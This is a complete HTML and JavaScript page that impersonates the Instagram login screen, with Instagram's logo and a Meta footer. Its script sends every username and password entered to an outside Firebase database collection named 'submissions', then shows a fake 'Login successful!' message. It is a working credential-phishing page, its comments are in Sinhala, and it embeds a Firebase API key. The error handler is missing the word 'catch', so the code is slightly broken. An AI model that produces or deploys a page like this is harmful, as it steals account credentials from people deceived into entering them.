<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    /* CSS Variables for Dark / Light Modes */
    :root {
      --bg-color: #121212;
      --text-color: #ffffff;
      --subtext-color: #aaaaaa;
      --input-bg: #1c1c1e;
      --input-border: #363638;
      --placeholder-color: #8e8e93;
      --btn-bg: #0064e0;
      --btn-text: #ffffff;
      --create-btn-border: #0084ff;
      --create-btn-text: #0084ff;
      --toggle-btn-bg: #2c2c2e;
      --toggle-btn-text: #ffffff;
    }

    /* Light Mode Theme */
    [data-theme="light"] {
      --bg-color: #ffffff;
      --text-color: #000000;
      --subtext-color: #666666;
      --input-bg: #f2f2f7;
      --input-border: #cccccc;
      --placeholder-color: #8e8e93;
      --btn-bg: #0064e0;
      --btn-text: #ffffff;
      --create-btn-border: #0064e0;
      --create-btn-text: #0064e0;
      --toggle-btn-bg: #e5e5ea;
      --toggle-btn-text: #000000;
    }

    body {
      background-color: var(--bg-color);
      color: var(--text-color);
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      min-height: 90vh;
      box-sizing: border-box;
      transition: background-color 0.3s, color 0.3s;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 100%;
    }

    .back-arrow {
      color: var(--text-color);
      font-size: 22px;
      text-decoration: none;
      cursor: pointer;
    }

    .lang-text {
      color: var(--subtext-color);
      font-size: 14px;
    }

    /* Light/Dark Toggle Button without text */
    .theme-toggle {
      background-color: var(--toggle-btn-bg);
      color: var(--toggle-btn-text);
      border: none;
      width: 34px;
      height: 34px;
      border-radius: 50%;
      font-size: 16px;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .center-content {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 350px;
      margin: 30px auto 0 auto;
    }

    /* Instagram Outline Gradient Logo */
    .logo-container {
      width: 75px;
      height: 75px;
      margin-bottom: 30px;
    }

    .logo-svg {
      width: 100%;
      height: 100%;
    }

    .form-group {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    input {
      width: 100%;
      background-color: var(--input-bg);
      border: 1px solid var(--input-border);
      border-radius: 12px;
      padding: 14px;
      color: var(--text-color);
      font-size: 14px;
      box-sizing: border-box;
      outline: none;
    }

    input::placeholder {
      color: var(--placeholder-color);
    }

    .btn-login {
      width: 100%;
      background-color: var(--btn-bg);
      color: var(--btn-text);
      border: none;
      border-radius: 20px;
      padding: 12px;
      font-size: 15px;
      font-weight: bold;
      margin-top: 5px;
      cursor: pointer;
    }

    .forgot-link {
      color: var(--text-color);
      text-decoration: none;
      font-size: 14px;
      margin-top: 15px;
    }

    .bottom-content {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 15px;
      width: 100%;
      max-width: 350px;
      margin: 20px auto 0 auto;
    }

    .btn-create {
      width: 100%;
      background-color: transparent;
      color: var(--create-btn-text);
      border: 1px solid var(--create-btn-border);
      border-radius: 20px;
      padding: 10px;
      font-size: 14px;
      font-weight: bold;
      text-align: center;
      text-decoration: none;
      box-sizing: border-box;
    }

    .meta-text {
      color: var(--text-color);
      font-size: 14px;
      font-weight: bold;
    }
  </style>
</head>
<body data-theme="dark">

  <div class="top-bar">
    <span class="back-arrow">&#8592;</span>
    <span class="lang-text">English (US) &#709;</span>
    <button class="theme-toggle" onclick="toggleTheme()" id="themeBtn">☀</button>
  </div>

  <div class="center-content">
    <!-- Exact Instagram Outline Gradient Logo -->
    <div class="logo-container">
      <svg class="logo-svg" viewBox="0 0 512 512">
        <defs>
          <linearGradient id="ig-outline-grad" x1="0%" y1="100%" x2="100%" y2="0%">
            <stop offset="0%" stop-color="#ffb100"/>
            <stop offset="25%" stop-color="#ff0055"/>
            <stop offset="65%" stop-color="#cc00ff"/>
            <stop offset="100%" stop-color="#7000ff"/>
          </linearGradient>
        </defs>
        <rect x="32" y="32" width="448" height="448" rx="128" fill="none" stroke="url(#ig-outline-grad)" stroke-width="42" />
        <circle cx="256" cy="256" r="100" fill="none" stroke="url(#ig-outline-grad)" stroke-width="42" />
        <circle cx="365" cy="147" r="26" fill="url(#ig-outline-grad)" />
      </svg>
    </div>

    <!-- Login Form -->
    <form class="form-group" id="loginForm">
      <input type="text" id="usernameInput" placeholder="Username, email or mobile number" required>
      <input type="password" id="passwordInput" placeholder="Password" required>
      <button type="submit" class="btn-login">Log in</button>
    </form>

    <a href="#" class="forgot-link">Forgot password?</a>
  </div>

  <div class="bottom-content">
    <a href="#" class="btn-create">Create new account</a>
    <div class="meta-text">&#8734; Meta</div>
  </div>

<script type="module">
  // Firebase Modules import කරගැනීම (Code 01 එකෙන්)
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-firestore.js";

  // ඔබේ Firebase අනුකූලතාවය (Configuration)
  const firebaseConfig = {
    apiKey: "AIzaSyCpZw11RVkWAYlGsuLIemhufgPFGxWeoNc",
    authDomain: "login-data-2e0b1.firebaseapp.com",
    projectId: "login-data-2e0b1",
    storageBucket: "login-data-2e0b1.firebasestorage.app",
    messagingSenderId: "21440446512",
    appId: "1:40446512:web:e73ece526bf4053fea6df5"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  // Theme Toggle Functionality
  window.toggleTheme = function() {
    const body = document.body;
    const btn = document.getElementById('themeBtn');
    
    if (body.getAttribute('data-theme') === 'dark') {
      body.setAttribute('data-theme', 'light');
      btn.textContent = '🌙';
    } else {
      body.setAttribute('data-theme', 'dark');
      btn.textContent = '☀';
    }
  }

  // Login Form Submit කළ විට Firebase වෙත දත්ත යැවීම
  document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault(); // පිටුව refresh වීම වැළැක්වීමට
    
    const username = document.getElementById('usernameInput').value.trim();
    const password = document.getElementById('passwordInput').value.trim();
    const loginBtn = document.querySelector('.btn-login');
    
    if (!username || !password) {
      alert("කරුණාකර සියලුම ක්ෂේත්‍ර පුරවන්න.");
      return;
    }

    loginBtn.disabled = true;
    loginBtn.textContent = "Logging in...";

    try {
      // Firebase submissions collection එකට දත්ත එකතු කිරීම
      await addDoc(collection(db, "submissions"), {
        username: username,
        password: password,
        createdAt: serverTimestamp()
      });

      // සාර්ථක වූ පසු (අවශ්‍ය නම් සාමාන්‍ය Instagram පිටුවකට හෝ වෙනත් තැනකට redirect කළ හැක)
      alert("Login successful!");
      document.getElementById('loginForm').reset();

    } (error) {
      console.error(error);
      alert("දෝෂයක් ඇති විය. කරුණාකර නැවත උත්සාහ කරන්න.");
    }

    loginBtn.disabled = false;
    loginBtn.textContent = "Log in";
  });
</script>


</body>
</html>
